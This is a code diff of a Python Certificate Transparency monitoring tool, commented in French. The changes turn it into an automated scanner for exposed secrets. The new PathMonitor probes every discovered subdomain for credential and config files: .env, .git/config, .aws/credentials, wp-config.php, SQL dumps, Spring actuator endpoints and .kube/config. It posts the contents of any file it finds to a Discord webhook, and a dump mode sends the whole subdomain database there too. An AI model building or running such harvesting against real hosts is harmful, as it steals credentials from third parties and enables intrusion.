@@ -201,32 +201,45 @@ class CertificateDatabase:
         conn   = self._get_conn()
         cursor = conn.cursor()
 
+        # Table principale — tous les sous-domaines découverts
         cursor.execute('''
-            CREATE TABLE IF NOT EXISTS unreachable_domains (
+            CREATE TABLE IF NOT EXISTS subdomains (
                 id          INTEGER PRIMARY KEY AUTOINCREMENT,
                 domain      TEXT UNIQUE NOT NULL,
                 base_domain TEXT NOT NULL,
                 status_code INTEGER,
+                is_online   BOOLEAN DEFAULT 0,
                 first_seen  TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                 last_check  TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                log_source  TEXT,
-                notified    BOOLEAN DEFAULT 0
+                log_source  TEXT
             )
         ''')
 
+        # Historique des checks
         cursor.execute('''
             CREATE TABLE IF NOT EXISTS check_history (
                 id               INTEGER PRIMARY KEY AUTOINCREMENT,
                 domain           TEXT NOT NULL,
                 status_code      INTEGER,
                 response_time_ms INTEGER,
-                check_timestamp  TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                FOREIGN KEY(domain) REFERENCES unreachable_domains(domain)
+                check_timestamp  TIMESTAMP DEFAULT CURRENT_TIMESTAMP
             )
         ''')
 
-        cursor.execute('CREATE INDEX IF NOT EXISTS idx_domain     ON unreachable_domains(domain)')
-        cursor.execute('CREATE INDEX IF NOT EXISTS idx_last_check ON unreachable_domains(last_check)')
+        # Migration: si l ancienne table existe, copier les données
+        cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='unreachable_domains'")
+        if cursor.fetchone():
+            cursor.execute('''
+                INSERT OR IGNORE INTO subdomains (domain, base_domain, status_code, is_online, first_seen, last_check, log_source)
+                SELECT domain, base_domain, status_code, 0, first_seen, last_check, log_source
+                FROM unreachable_domains
+            ''')
+            cursor.execute('DROP TABLE unreachable_domains')
+            tprint("[DB] Migration unreachable_domains → subdomains effectuée")
+
+        cursor.execute('CREATE INDEX IF NOT EXISTS idx_domain     ON subdomains(domain)')
+        cursor.execute('CREATE INDEX IF NOT EXISTS idx_last_check ON subdomains(last_check)')
+        cursor.execute('CREATE INDEX IF NOT EXISTS idx_is_online  ON subdomains(is_online)')
         conn.commit()
         tprint(f"[DB] Initialisée: {self.db_path}")
 
@@ -234,19 +247,44 @@ class CertificateDatabase:
         try:
             conn   = self._get_conn()
             cursor = conn.cursor()
-            cursor.execute('SELECT 1 FROM unreachable_domains WHERE domain = ? LIMIT 1', (domain,))
+            cursor.execute('SELECT 1 FROM subdomains WHERE domain = ? LIMIT 1', (domain,))
             return cursor.fetchone() is not None
         except Exception as e:
             tprint(f"[DB ERROR] subdomain_exists: {e}")
             return False
 
+    def add_domain(self, domain, base_domain, status_code, log_source):
+        is_online = 1 if (status_code and 200 <= status_code < 400) else 0
+        try:
+            conn   = self._get_conn()
+            cursor = conn.cursor()
+            cursor.execute('SELECT 1 FROM subdomains WHERE domain = ? LIMIT 1', (domain,))
+            if cursor.fetchone():
+                cursor.execute(
+                    'UPDATE subdomains SET status_code = ?, is_online = ?, last_check = CURRENT_TIMESTAMP WHERE domain = ?',
+                    (status_code, is_online, domain)
+                )
+                conn.commit()
+                return False
+            cursor.execute(
+                'INSERT INTO subdomains (domain, base_domain, status_code, is_online, log_source) VALUES (?, ?, ?, ?, ?)',
+                (domain, base_domain, status_code, is_online, log_source)
+            )
+            conn.commit()
+            tprint(f"[DB] Nouveau: {domain} [{status_code if status_code else 'timeout'}]")
+            return True
+        except Exception as e:
+            tprint(f"[DB ERROR] add_domain {domain}: {e}")
+            return False
+
     def add_subdomain_from_file(self, domain, base_domain, status_code=None):
+        is_online = 1 if (status_code and 200 <= status_code < 400) else 0
         try:
             conn   = self._get_conn()
             cursor = conn.cursor()
             cursor.execute(
-                'INSERT OR IGNORE INTO unreachable_domains (domain, base_domain, status_code, log_source) VALUES (?, ?, ?, ?)',
-                (domain, base_domain, status_code, "MANUAL_LOAD")
+                'INSERT OR IGNORE INTO subdomains (domain, base_domain, status_code, is_online, log_source) VALUES (?, ?, ?, ?, ?)',
+                (domain, base_domain, status_code, is_online, "MANUAL_LOAD")
             )
             conn.commit()
             return True
@@ -254,46 +292,40 @@ class CertificateDatabase:
             tprint(f"[DB ERROR] add_subdomain_from_file {domain}: {e}")
             return False
 
-    def add_unreachable(self, domain, base_domain, status_code, log_source):
-        try:
-            conn   = self._get_conn()
-            cursor = conn.cursor()
-            cursor.execute('SELECT 1 FROM unreachable_domains WHERE domain = ? LIMIT 1', (domain,))
-            if cursor.fetchone():
-                return False  # doublon silencieux
-            cursor.execute(
-                'INSERT INTO unreachable_domains (domain, base_domain, status_code, log_source) VALUES (?, ?, ?, ?)',
-                (domain, base_domain, status_code, log_source)
-            )
-            conn.commit()
-            tprint(f"[DB] ✅ Ajouté: {domain}")
-            return True
-        except Exception as e:
-            tprint(f"[DB ERROR] add_unreachable {domain}: {e}")
-            return False
-
-    def get_unreachable(self, limit=100):
+    def get_offline(self, limit=100):
         try:
             conn   = self._get_conn()
             cursor = conn.cursor()
             cursor.execute('''
                 SELECT domain, base_domain, last_check
-                FROM unreachable_domains
+                FROM subdomains
+                WHERE is_online = 0
                 ORDER BY last_check ASC NULLS FIRST
                 LIMIT ?
             ''', (limit,))
             return cursor.fetchall()
         except Exception as e:
-            tprint(f"[DB ERROR] get_unreachable: {e}")
+            tprint(f"[DB ERROR] get_offline: {e}")
+            return []
+
+    def get_all_domains(self):
+        try:
+            conn   = self._get_conn()
+            cursor = conn.cursor()
+            cursor.execute('SELECT domain FROM subdomains ORDER BY domain')
+            return [row[0] for row in cursor.fetchall()]
+        except Exception as e:
+            tprint(f"[DB ERROR] get_all_domains: {e}")
             return []
 
     def update_check(self, domain, status_code, response_time_ms):
+        is_online = 1 if (status_code and 200 <= status_code < 400) else 0
         try:
             conn   = self._get_conn()
             cursor = conn.cursor()
             cursor.execute(
-                'UPDATE unreachable_domains SET status_code = ?, last_check = CURRENT_TIMESTAMP WHERE domain = ?',
-                (status_code, domain)
+                'UPDATE subdomains SET status_code = ?, is_online = ?, last_check = CURRENT_TIMESTAMP WHERE domain = ?',
+                (status_code, is_online, domain)
             )
             cursor.execute(
                 'INSERT INTO check_history (domain, status_code, response_time_ms) VALUES (?, ?, ?)',
@@ -305,32 +337,24 @@ class CertificateDatabase:
             tprint(f"[DB ERROR] update_check {domain}: {e}")
             return False
 
-    def mark_notified(self, domain):
+    def mark_online(self, domain, status_code):
         try:
             conn   = self._get_conn()
             cursor = conn.cursor()
-            cursor.execute('UPDATE unreachable_domains SET notified = 1 WHERE domain = ?', (domain,))
+            cursor.execute(
+                'UPDATE subdomains SET is_online = 1, status_code = ?, last_check = CURRENT_TIMESTAMP WHERE domain = ?',
+                (status_code, domain)
+            )
             conn.commit()
+            tprint(f"[DB] {domain} marque online [{status_code}]")
         except Exception as e:
-            tprint(f"[DB ERROR] mark_notified {domain}: {e}")
-
-    def remove_domain(self, domain):
-        """Supprime un domaine de la DB quand il est redevenu accessible."""
-        try:
-            conn   = self._get_conn()
-            cursor = conn.cursor()
-            cursor.execute('DELETE FROM unreachable_domains WHERE domain = ?', (domain,))
-            conn.commit()
-            tprint(f"[DB] 🗑️  {domain} retiré du monitoring (redevenu accessible)")
-        except Exception as e:
-            tprint(f"[DB ERROR] remove_domain {domain}: {e}")
-
+            tprint(f"[DB ERROR] mark_online {domain}: {e}")
     def count(self):
         """Retourne le nombre de domaines en monitoring."""
         try:
             conn   = self._get_conn()
             cursor = conn.cursor()
-            cursor.execute('SELECT COUNT(*) FROM unreachable_domains')
+            cursor.execute('SELECT COUNT(*) FROM subdomains')
             return cursor.fetchone()[0]
         except Exception as e:
             return 0
@@ -351,51 +375,86 @@ class CertificateDatabase:
             cursor.execute('''
                 SELECT 
                     COUNT(*) as total,
-                    SUM(CASE WHEN status_code IS NULL THEN 1 ELSE 0 END) as timeouts,
+                    SUM(CASE WHEN is_online = 1 THEN 1 ELSE 0 END) as online,
+                    SUM(CASE WHEN is_online = 0 AND status_code IS NULL THEN 1 ELSE 0 END) as timeouts,
                     SUM(CASE WHEN status_code >= 400 AND status_code < 500 THEN 1 ELSE 0 END) as errors_4xx,
                     SUM(CASE WHEN status_code >= 500 THEN 1 ELSE 0 END) as errors_5xx
-                FROM unreachable_domains
+                FROM subdomains
             ''')
             row = cursor.fetchone()
             return {
                 'total':    row[0],
-                'timeout':  row[1],
-                '4xx':      row[2],
-                '5xx':      row[3],
+                'online':   row[1],
+                'timeout':  row[2],
+                '4xx':      row[3],
+                '5xx':      row[4],
             }
         except Exception:
-            return {'total': 0, 'timeout': 0, '4xx': 0, '5xx': 0}
+            return {'total': 0, 'online': 0, 'timeout': 0, '4xx': 0, '5xx': 0}
 
 db = CertificateDatabase(DATABASE_FILE)
 
 # ==================== PATHS MONITOR ====================
 class PathMonitor:
-    """Monitore des URLs spécifiques et envoie le contenu à Discord si 200."""
+    # Paths predefinies — chargees depuis paths.txt + defaults integres
+    DEFAULT_PATHS = [
+        # Tres haute probabilite
+        "/.env", "/.env.local", "/.env.production", "/.env.prod",
+        "/.env.backup", "/.env.old", "/.env.dev", "/.env.staging",
+        "/.git/config", "/.git/HEAD", "/.git/FETCH_HEAD",
+        "/wp-config.php", "/config.php", "/configuration.php",
+        "/config.yml", "/config.yaml", "/config.json",
+        "/database.yml", "/database.yaml",
+        "/settings.py", "/local_settings.py",
+        "/secrets.yml", "/secrets.json", "/credentials.json",
+        # Haute probabilite
+        "/actuator", "/actuator/env", "/actuator/health",
+        "/actuator/beans", "/actuator/mappings", "/actuator/logfile",
+        "/backup.sql", "/dump.sql", "/db.sql", "/database.sql",
+        "/.aws/credentials", "/.aws/config",
+        "/phpinfo.php", "/info.php", "/test.php",
+        "/server-status", "/server-info",
+        # Panels admin
+        "/admin", "/admin/", "/administrator", "/administrator/",
+        "/wp-admin/", "/phpmyadmin/", "/pma/", "/cpanel",
+        # APIs et documentation
+        "/swagger", "/swagger-ui.html", "/swagger-ui/",
+        "/api-docs", "/api/docs", "/api/v1/", "/api/v2/",
+        "/graphql", "/graphiql",
+        "/api/swagger.json", "/api/openapi.json",
+        # Consoles et debug
+        "/console", "/h2-console", "/debug", "/trace",
+        "/metrics", "/health", "/status", "/jolokia",
+        # Logs
+        "/error.log", "/access.log", "/debug.log", "/app.log",
+        # CI/CD et infra
+        "/.kube/config", "/docker-compose.yml", "/docker-compose.yaml",
+    ]
 
     def __init__(self, paths_file):
         self.paths_file = paths_file
-        self.paths      = {}
+        self.paths      = list(self.DEFAULT_PATHS)
         self.load_paths()
 
     def load_paths(self):
         if not os.path.exists(self.paths_file):
-            tprint(f"[PATHS] {self.paths_file} n'existe pas (optionnel)")
+            tprint(f"[PATHS] {self.paths_file} absent — utilisation des paths par defaut ({len(self.paths)})")
             return
         try:
             with open(self.paths_file, 'r') as f:
-                lines = [l.strip() for l in f if l.strip() and not l.startswith('#')]
-            for line in lines:
-                if line.startswith('http'):
-                    self.paths[line] = line
-                    tprint(f"[PATHS] ✅ Chargé: {line}")
-            tprint(f"[PATHS] Total: {len(self.paths)} paths")
+                custom = [l.strip() for l in f if l.strip() and not l.startswith('#')]
+            # Fusionner defaults + custom sans doublons
+            for p in custom:
+                if p not in self.paths:
+                    self.paths.append(p)
+            tprint(f"[PATHS] {len(self.DEFAULT_PATHS)} paths par defaut + {len(custom)} custom = {len(self.paths)} total")
         except Exception as e:
             tprint(f"[PATHS ERROR] {e}")
 
     def check_path(self, url):
-        """Retourne (status_code, content, response_time_ms, error)."""
         try:
-            response      = requests.get(url, timeout=HTTP_CHECK_TIMEOUT, verify=False, allow_redirects=True)
+            response      = requests.get(url, timeout=HTTP_CHECK_TIMEOUT, verify=False, allow_redirects=True,
+                                         headers={'User-Agent': 'Mozilla/5.0 (compatible; CTMonitor/1.0)'})
             response_time = int(response.elapsed.total_seconds() * 1000)
             if response.status_code == 200:
                 content = response.text
@@ -406,7 +465,6 @@ class PathMonitor:
         except requests.exceptions.Timeout:
             return (None, None, HTTP_CHECK_TIMEOUT * 1000, "Timeout")
         except Exception as e:
-            tprint(f"[PATHS CHECK ERROR] {url}: {e}")
             return (None, None, None, str(e))
 
     def _send_embed(self, embed):
@@ -419,9 +477,9 @@ class PathMonitor:
     def send_content_alert(self, url, content):
         preview = content[:1900]
         if len(content) > 1900:
-            preview += f"\n... (tronqué, taille totale: {len(content)} chars)"
+            preview += f"\n... (tronque, taille totale: {len(content)} chars)"
         embed = {
-            "title":       f"✅ Fichier sensible accessible",
+            "title":       "✅ Fichier sensible accessible",
             "description": f"`{url}`\n\n```\n{preview}\n```",
             "color":       0x00ff00,
             "fields": [
@@ -432,45 +490,36 @@ class PathMonitor:
             "timestamp": datetime.utcnow().isoformat()
         }
         self._send_embed(embed)
-        tprint(f"[PATHS ALERT] Contenu envoyé: {url}")
+        tprint(f"[PATHS ALERT] Fichier sensible: {url}")
 
-    def send_retrieve_failed_alert(self, url, error_msg):
-        embed = {
-            "title":       "Path - contenu vide",
-            "description": f"`{url}`\nStatus 200 mais contenu vide — {error_msg}",
-            "color":       0x888888,
-            "footer":    {"text": "CT Monitor"},
-            "timestamp": datetime.utcnow().isoformat()
-        }
-        self._send_embed(embed)
-        tprint(f"[PATHS] Retrieve failed: {url} — {error_msg}")
-
-    def send_check_failed_alert(self, url, status_code, response_time):
-        status_str = str(status_code) if status_code else "timeout"
-        embed = {
-            "title":       "Path inaccessible",
-            "description": f"`{url}` — {status_str}",
-            "color":       0x888888,
-            "footer":    {"text": "CT Monitor"},
-            "timestamp": datetime.utcnow().isoformat()
-        }
-        self._send_embed(embed)
-        tprint(f"[PATHS] Check failed: {url} [{status_str}]")
+    def check_domain(self, domain):
+        # Verifie tous les paths sur un domaine donne
+        host, port = parse_subdomain_entry(domain)
+        found = 0
+        for path in self.paths:
+            for protocol in ['https', 'http']:
+                url = f"{protocol}://{host}{path}"
+                status_code, content, response_time, error = self.check_path(url)
+                if status_code == 200 and content:
+                    self.send_content_alert(url, content)
+                    found += 1
+                    break  # pas besoin de tester http si https ok
+        return found
 
     def check_all(self):
-        if not self.paths:
+        # Recupere tous les domaines en DB et verifie les paths sur chacun
+        all_domains = db.get_all_domains()
+        if not all_domains:
             return
-        tprint(f"[PATHS CRON] Vérification de {len(self.paths)} paths...")
-        for url in self.paths:
-            status_code, content, response_time, error = self.check_path(url)
-            if status_code == 200:
-                if content:
-                    self.send_content_alert(url, content)
-                else:
-                    self.send_retrieve_failed_alert(url, error or "Unknown error")
-            else:
-                self.send_check_failed_alert(url, status_code, response_time)
-
+        tprint(f"[PATHS CRON] Scan de {len(self.paths)} paths sur {len(all_domains)} domaines...")
+        total_found = 0
+        for domain in all_domains:
+            found = self.check_domain(domain)
+            total_found += found
+        if total_found > 0:
+            tprint(f"[PATHS CRON] {total_found} fichier(s) sensible(s) trouve(s)!")
+        else:
+            tprint(f"[PATHS CRON] Aucun fichier sensible trouve")
 path_monitor = PathMonitor(PATHS_FILE)
 
 # ==================== CHARGEMENT DOMAINES CIBLES ====================
@@ -855,7 +904,7 @@ def cron_recheck_unreachable():
     tprint("[CRON] Thread recheck démarré")
     while True:
         try:
-            domains = db.get_unreachable(limit=100)
+            domains = db.get_offline(limit=100)
             total   = db.count()
 
             tprint(f"[CRON] ---- Recheck démarré — {total} domaine(s) en monitoring ----")
@@ -888,7 +937,7 @@ def cron_recheck_unreachable():
                     if status_code and 200 <= status_code < 400:
                         tprint(f"[CRON] ✅ {domain} [{status_str}]{port_status} — redevenu accessible!")
                         send_now_accessible_alert(domain)
-                        db.remove_domain(domain)
+                        db.mark_online(domain, status_code)
                         back_online += 1
                     else:
                         db.update_check(domain, status_code, response_time)
@@ -991,12 +1040,10 @@ def monitor_log(log_config):
 
                 all_results.append((domain, status_code))
 
-                # Stocker en DB tout ce qui n'est pas 200-3xx
-                # 4xx, 5xx, timeout = à monitorer jusqu'au retour en ligne
-                if status_code is None or status_code >= 400:
-                    base = next((t for t in targets if domain == t or domain.endswith('.' + t)), None)
-                    if base:
-                        db.add_unreachable(domain, base, status_code, log_name)
+                # Stocker TOUS les domaines en DB (200 ou pas)
+                base = next((t for t in targets if domain == t or domain.endswith('.' + t)), None)
+                if base:
+                    db.add_domain(domain, base, status_code, log_name)
 
         current_pos                   = end_pos
         stats['positions'][log_name]  = current_pos
@@ -1035,18 +1082,18 @@ def cleanup_db():
         cursor = conn.cursor()
 
         # Supprimer les wildcards
-        cursor.execute("DELETE FROM unreachable_domains WHERE domain LIKE '*.%'")
+        cursor.execute("DELETE FROM subdomains WHERE domain LIKE '*.%'")
         wildcards_deleted = cursor.rowcount
 
         # Supprimer les domaines qui ne matchent plus aucune cible
-        cursor.execute("SELECT domain FROM unreachable_domains")
+        cursor.execute("SELECT domain FROM subdomains")
         all_domains = [row[0] for row in cursor.fetchall()]
         orphans = [
             d for d in all_domains
             if not any(d == t or d.endswith('.' + t) for t in targets)
         ]
         for orphan in orphans:
-            cursor.execute("DELETE FROM unreachable_domains WHERE domain = ?", (orphan,))
+            cursor.execute("DELETE FROM subdomains WHERE domain = ?", (orphan,))
 
         conn.commit()
 
@@ -1062,38 +1109,76 @@ def cleanup_db():
 
 # ==================== DUMP DB (variable DUMP_DB=1) ====================
 def dump_db():
-    tprint("[DUMP] ================================================")
-    tprint("[DUMP] Contenu de la base de données")
-    tprint("[DUMP] ================================================")
+    tprint("[DUMP] Envoi du contenu de la DB sur Discord...")
     try:
         conn   = db._get_conn()
         cursor = conn.cursor()
-
-        # Stats globales
         summary = db.stats_summary()
-        tprint(f"[DUMP] Total: {summary['total']} domaines | {db.size_mb()} MB")
-        tprint(f"[DUMP] timeout: {summary['timeout']} | 4xx: {summary['4xx']} | 5xx: {summary['5xx']}")
-        tprint("[DUMP] ------------------------------------------------")
 
-        # Tous les domaines
+        # Message d'en-tête
+        header_embed = {
+            "title": "Base de données — Dump complet",
+            "description": (
+                f"**Total:** {summary['total']} domaine(s) en monitoring\n"
+                f"**Taille:** {db.size_mb()} MB\n"
+                f"**Timeout:** {summary['timeout']} | **4xx:** {summary['4xx']} | **5xx:** {summary['5xx']}"
+            ),
+            "color": 0x5865f2,
+            "footer": {"text": "CT Monitor — DUMP_DB"},
+            "timestamp": datetime.utcnow().isoformat()
+        }
+        requests.post(DISCORD_WEBHOOK, json={"embeds": [header_embed]}, timeout=10)
+
+        # Envoyer les domaines par groupes de 20 (limite Discord)
         cursor.execute('''
-            SELECT domain, base_domain, status_code, log_source, first_seen, last_check
-            FROM unreachable_domains
+            SELECT domain, status_code, log_source, last_check
+            FROM subdomains
             ORDER BY last_check DESC
         ''')
         rows = cursor.fetchall()
-        for domain, base, status, source, first_seen, last_check in rows:
-            status_str = str(status) if status else "timeout"
-            tprint(f"[DUMP] {domain} [{status_str}] | base={base} | source={source} | vu={first_seen} | recheck={last_check}")
 
-        tprint("[DUMP] ================================================")
-        tprint("[DUMP] Fin du dump — retire DUMP_DB=1 pour relancer le monitoring")
+        chunk_size = 20
+        for i in range(0, len(rows), chunk_size):
+            chunk = rows[i:i+chunk_size]
+            lines = []
+            for domain, status, source, last_check in chunk:
+                status_str = str(status) if status else "timeout"
+                last_check_str = last_check[:16] if last_check else "jamais"
+                lines.append(f"`{domain}` [{status_str}] — {last_check_str}")
+
+            embed = {
+                "title": f"Domaines {i+1}–{i+len(chunk)} / {len(rows)}",
+                "description": "\n".join(lines),
+                "color": 0x2f3136,
+                "footer": {"text": "CT Monitor — DUMP_DB"},
+            }
+            requests.post(DISCORD_WEBHOOK, json={"embeds": [embed]}, timeout=10)
+            time.sleep(0.5)  # eviter rate limit Discord
+
+        # Message de fin
+        end_embed = {
+            "title": "Dump terminé",
+            "description": "Retire `DUMP_DB=1` dans Railway pour relancer le monitoring.",
+            "color": 0x00ff00,
+            "footer": {"text": "CT Monitor — DUMP_DB"},
+        }
+        requests.post(DISCORD_WEBHOOK, json={"embeds": [end_embed]}, timeout=10)
+        tprint(f"[DUMP] {len(rows)} domaine(s) envoyés sur Discord")
+
     except Exception as e:
         tprint(f"[DUMP ERROR] {e}")
+        if DISCORD_WEBHOOK:
+            requests.post(DISCORD_WEBHOOK, json={"embeds": [{
+                "title": "Dump erreur",
+                "description": str(e),
+                "color": 0xff0000
+            }]}, timeout=10)
 
-# Si DUMP_DB=1 → afficher la DB et quitter
+# Si DUMP_DB=1 → envoyer la DB sur Discord et quitter
 if os.environ.get('DUMP_DB', '0') == '1':
+    tprint("[DUMP] Mode DUMP_DB activé — envoi sur Discord...")
     dump_db()
+    tprint("[DUMP] Terminé — arrêt du container")
     exit(0)
 
 # ==================== DÉMARRAGE ====================
@@ -1108,7 +1193,7 @@ tprint("[START] ================================================")
 tprint("[STARTUP] Etape 1/3 — Nettoyage base de données...")
 cleanup_db()
 _db_stats = db.stats_summary()
-tprint(f"[STARTUP] DB: {_db_stats['total']} domaine(s) en monitoring | {db.size_mb()} MB")
+tprint(f"[STARTUP] DB: {_db_stats['total']} domaines | online={_db_stats['online']} | offline={_db_stats['total']-_db_stats['online']} | {db.size_mb()} MB")
 tprint(f"[STARTUP] DB detail: {_db_stats['timeout']} timeout | {_db_stats['4xx']} 4xx | {_db_stats['5xx']} 5xx")
 
 # Chargement subdomains manuels
